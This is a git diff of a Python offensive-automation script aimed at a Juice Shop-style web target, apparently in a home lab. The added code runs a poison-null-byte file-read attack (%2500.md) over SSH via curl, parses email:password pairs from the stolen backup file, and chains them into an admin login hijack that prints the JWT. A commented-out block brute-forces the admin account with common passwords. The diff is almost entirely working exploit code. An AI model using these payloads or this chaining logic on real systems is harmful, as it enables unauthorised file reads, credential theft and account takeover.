@@ -21,6 +21,11 @@ DEFAULT_ZAP_PROXY = "http://192.168.190.129:8081"
 DEFAULT_POLL_INTERVAL = 2
 SQL_INJECTION_NAME = "sql injection"
 
+# === Global Context for Exploit Chaining ===
+EXPLOIT_CONTEXT = {
+    "extracted_credentials": []
+}
+
 
 def parse_args() -> argparse.Namespace:
   parser = argparse.ArgumentParser(
@@ -321,49 +326,49 @@ def run_remote_commix(target_url: str, kali_ip: str) -> None:
     finally:
         ssh.close()
 
-def run_custom_admin_hijacker(target_url: str, kali_ip: str) -> None:
-    print(f"\n[!] Initiating Custom API Attack: Admin Account Hijacking...")
+# def run_custom_admin_hijacker(target_url: str, kali_ip: str) -> None:
+#     print(f"\n[!] Initiating Custom API Attack: Admin Account Hijacking...")
     
-    # חילוץ כתובת הבסיס (http://192.168.190.129:3000)
-    from urllib.parse import urlparse
-    parsed = urlparse(target_url)
-    base_url = f"{parsed.scheme}://{parsed.netloc}"
+#     # חילוץ כתובת הבסיס (http://192.168.190.129:3000)
+#     from urllib.parse import urlparse
+#     parsed = urlparse(target_url)
+#     base_url = f"{parsed.scheme}://{parsed.netloc}"
     
-    login_api = f"{base_url}/rest/user/login"
-    print(f"[*] Targeting Login API: {login_api}")
+#     login_api = f"{base_url}/rest/user/login"
+#     print(f"[*] Targeting Login API: {login_api}")
     
-    # רשימת סיסמאות נפוצות (במציאות זה יהיה קובץ של אלפים, פה נשים את הקלאסיות)
-    passwords_to_try = ["123456", "password", "admin", "admin123", "admin@123", "root"]
-    admin_email = "admin@juice-sh.op" # האימייל הקבוע של מנהל ה-Juice Shop
+#     # רשימת סיסמאות נפוצות (במציאות זה יהיה קובץ של אלפים, פה נשים את הקלאסיות)
+#     passwords_to_try = ["123456", "password", "admin", "admin123", "admin@123", "root"]
+#     admin_email = "admin@juice-sh.op" # האימייל הקבוע של מנהל ה-Juice Shop
     
-    success = False
+#     success = False
     
-    for pwd in passwords_to_try:
-        print(f"[*] Trying credentials -> {admin_email} : {pwd}")
+#     for pwd in passwords_to_try:
+#         print(f"[*] Trying credentials -> {admin_email} : {pwd}")
         
-        # מבנה הבקשה ש-Juice Shop מצפה לקבל
-        payload = {"email": admin_email, "password": pwd}
+#         # מבנה הבקשה ש-Juice Shop מצפה לקבל
+#         payload = {"email": admin_email, "password": pwd}
         
-        try:
-            response = requests.post(login_api, json=payload, timeout=5)
+#         try:
+#             response = requests.post(login_api, json=payload, timeout=5)
             
-            # אם קיבלנו 200, הפריצה הצליחה!
-            if response.status_code == 200:
-                data = response.json()
-                token = data.get('authentication', {}).get('token', 'NO_TOKEN')
-                print("\n" + "="*40)
-                print("[+++] CRITICAL VULNERABILITY EXPLOITED [+++]")
-                print("[+] Admin account compromised successfully!")
-                print(f"[+] Password found: {pwd}")
-                print(f"[+] Admin JWT Token stolen:\n{token}")
-                print("="*40 + "\n")
-                success = True
-                break
-        except requests.exceptions.RequestException as e:
-            print(f"[-] Request failed: {e}")
+#             # אם קיבלנו 200, הפריצה הצליחה!
+#             if response.status_code == 200:
+#                 data = response.json()
+#                 token = data.get('authentication', {}).get('token', 'NO_TOKEN')
+#                 print("\n" + "="*40)
+#                 print("[+++] CRITICAL VULNERABILITY EXPLOITED [+++]")
+#                 print("[+] Admin account compromised successfully!")
+#                 print(f"[+] Password found: {pwd}")
+#                 print(f"[+] Admin JWT Token stolen:\n{token}")
+#                 print("="*40 + "\n")
+#                 success = True
+#                 break
+#         except requests.exceptions.RequestException as e:
+#             print(f"[-] Request failed: {e}")
             
-    if not success:
-        print("[-] Brute force failed. Password might be complex.")
+#     if not success:
+#         print("[-] Brute force failed. Password might be complex.")
 
 # def run_remote_xsstrike(target_url: str, kali_ip: str) -> None:
 #     print(f"\n[!] Initiating Advanced XSS Analysis with XSStrike on: {target_url}")
@@ -450,51 +455,104 @@ def run_custom_xss_weaponizer(target_url: str, kali_ip: str) -> None:
     print("="*80 + "\n")
 
 def run_remote_lfi_extractor(target_url: str, kali_ip: str) -> None:
-    print(f"\n[!] Initiating Advanced Arbitrary File Read Attack...")
+    print(f"\n[!] Initiating Advanced Arbitrary File Read Attack (LFI)...")
+    from urllib.parse import urlparse
+    parsed = urlparse(target_url)
+    base_url = f"{parsed.scheme}://{parsed.netloc}"
+    
+    # מכוונים בדיוק לקובץ ש-Cursor יצר לנו עם החולשה ש-Cursor יצר!
+    payload = "/ftp/admin-creds.txt.bak%2500.md"
+    attack_url = f"{base_url}{payload}"
+    
+    curl_cmd = f"curl -s \"{attack_url}\""
+    print(f"[*] Executing payload: Poison Null Byte (%2500.md) on target file...")
+    
+    out, err = execute_ssh_command(kali_ip, curl_cmd)
+    
+    # בודקים אם הצלחנו למשוך את הקובץ (מחפשים את השטרודל של האימייל)
+    if "@" in out and ":" in out:
+        print("\n" + "="*70)
+        print("[+++] CRITICAL ARBITRARY FILE READ EXPLOITED [+++]")
+        print("[+] Extracted Admin Credentials file via LFI!")
+        print(f"[*] File content:\n    {out.strip()}")
+        print("="*70 + "\n")
+        
+        # --- שלב החילוץ (Parsing) ---
+        print("[*] Parsing extracted file for credentials...")
+        try:
+            for line in out.split('\n'):
+                if ':' in line and '@' in line:
+                    email, password = line.strip().split(':', 1)
+                    print(f"[+] Found valid credential pair -> {email} : {password}")
+                    
+                    # שומרים בזיכרון המשותף
+                    EXPLOIT_CONTEXT["extracted_credentials"].append({
+                        "user": email,
+                        "pass": password
+                    })
+            
+            # --- שלב שרשור חולשות (Exploit Chaining) ---
+            if len(EXPLOIT_CONTEXT["extracted_credentials"]) > 0:
+                print("[!] Triggering Admin Hijacker directly with newly discovered credentials...")
+                # מפעילים את ה-Hijacker מיד!
+                run_custom_admin_hijacker(target_url, kali_ip)
+                
+        except Exception as e:
+            print(f"[-] Failed to parse credentials: {e}")
+    else:
+        print("[-] LFI Attack blocked or file not found. Output received:")
+        print(out[:200])
+
+def run_custom_admin_hijacker(target_url: str, kali_ip: str) -> None:
+    print(f"\n[!] Initiating Custom API Attack: Admin Account Hijacking...")
     
     from urllib.parse import urlparse
     parsed = urlparse(target_url)
     base_url = f"{parsed.scheme}://{parsed.netloc}"
     
-    username = os.getenv("KALI_USER", "kali")
-    password = os.getenv("KALI_PASSWORD", "kali")
+    # === התיקון שלך: מעודכן לנתיב ההתחברות האמיתי של הפרויקט ===
+    login_api = f"{base_url}/auth/sign-in"
+    print(f"[*] Targeting Login API: {login_api}")
     
-    ssh = paramiko.SSHClient()
-    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    # קוראים את הסיסמאות מתוך הזיכרון המשותף שה-LFI מילא
+    stolen_creds = EXPLOIT_CONTEXT.get("extracted_credentials", [])
     
-    try:
-        ssh.connect(hostname=kali_ip, username=username, password=password)
+    if not stolen_creds:
+        print("[-] No stolen credentials found in Global Context. Falling back to basic brute-force...")
+        stolen_creds = [
+            {"user": "admin@juice-sh.op", "pass": "admin123"},
+            {"user": "admin@juice-sh.op", "pass": "password"}
+        ]
+    
+    success = False
+    
+    for cred in stolen_creds:
+        email = cred["user"]
+        pwd = cred["pass"]
         
-        payload = "/ftp/package.json.bak%2500.md"
-        attack_url = f"{base_url}{payload}"
+        print(f"[*] Trying credentials -> {email} : {pwd}")
+        payload = {"email": email, "password": pwd}
         
-        curl_cmd = f"curl -s \"{attack_url}\""
-        
-        print(f"[*] Executing payload: Extension Bypass (%2500.md) on internal backup file...")
-        stdin, stdout, stderr = ssh.exec_command(curl_cmd)
-        
-        output = stdout.read().decode('utf-8')
-        
-        if "juice-shop" in output or "dependencies" in output:
-            print("\n" + "="*70)
-            print("[+++] CRITICAL ARBITRARY FILE READ EXPLOITED [+++]")
-            print("[+] Successfully bypassed file extension restrictions!")
-            print("[+] Filter evasion successful using Poisoned Null Byte (%2500.md)")
-            print("\n[*] Extracted 'package.json.bak' FULL CONTENT:")
+        try:
+            response = requests.post(login_api, json=payload, timeout=5)
             
-            # הדפסת כל הקובץ ללא הגבלה!
-            for line in output.split('\n'):
-                if line.strip():
-                    print(f"    {line}")
-            print("="*70 + "\n")
-        else:
-            print("[-] Attack blocked. Output received:")
-            print(output[:200]) 
+            # אם קיבלנו 200, הפריצה הצליחה
+            if response.status_code == 200:
+                data = response.json()
+                token = data.get('token') or data.get('authentication', {}).get('token', 'NO_TOKEN_FOUND')
+                print("\n" + "="*40)
+                print("[+++] KILL CHAIN COMPLETE [+++]")
+                print("[+] Admin account compromised using LFI-stolen credentials!")
+                print(f"[+] Password verified: {pwd}")
+                print(f"[+] Hijacked JWT Token:\n{token}")
+                print("="*40 + "\n")
+                success = True
+                break
+        except requests.exceptions.RequestException as e:
+            print(f"[-] Request failed: {e}")
             
-    except Exception as e:
-        print(f"[-] Attack failed: {e}")
-    finally:
-        ssh.close()
+    if not success:
+        print("[-] Hijack failed. Credentials might be invalid or the endpoint is protected.")
 
 def run_ftp_data_pillager(target_url: str, kali_ip: str) -> None:
     print(f"\n[!] Initiating Exposed Data Pillager (Security Misconfiguration)...")
